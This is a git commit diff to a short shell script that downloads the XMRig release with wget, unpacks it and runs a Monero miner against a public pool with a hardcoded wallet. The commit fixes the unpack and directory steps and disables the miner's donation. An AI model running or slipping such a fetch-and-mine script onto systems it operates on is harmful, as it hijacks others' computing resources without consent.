626ea43f98526b2e52d6425d44560a48f0eba5ba
Daisy <71977928+anhbtit80@users.noreply.github.com>
2025-03-06 23:08:35 +0700

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -2,10 +2,10 @@
 wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
 
 #unzip
-unzip xmrig-6.22.2-linux-static-x64.tar.gz
+tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
 
 #cd
-cd xmrig-6.22.2-linux-static-x64.tar.gz
+cd xmrig-6.22.2
 
 #run the code
-./xmrig -o pool.hashvault.pro:443 -u 458wDBqXmANaEQRqEeBEU474xigR2u6gkchgPMxeQMtFJTjpdhfFKTA2GZV3VCSTW2ieU8hTSnnwQ2rz1arMjXm231CL8CL -k --coin monero -a rx/0
+./xmrig -o pool.hashvault.pro:443 -u 458wDBqXmANaEQRqEeBEU474xigR2u6gkchgPMxeQMtFJTjpdhfFKTA2GZV3VCSTW2ieU8hTSnnwQ2rz1arMjXm231CL8CL -k --coin monero -a rx/0 --donate-level=0 --randomx-1gb-pages
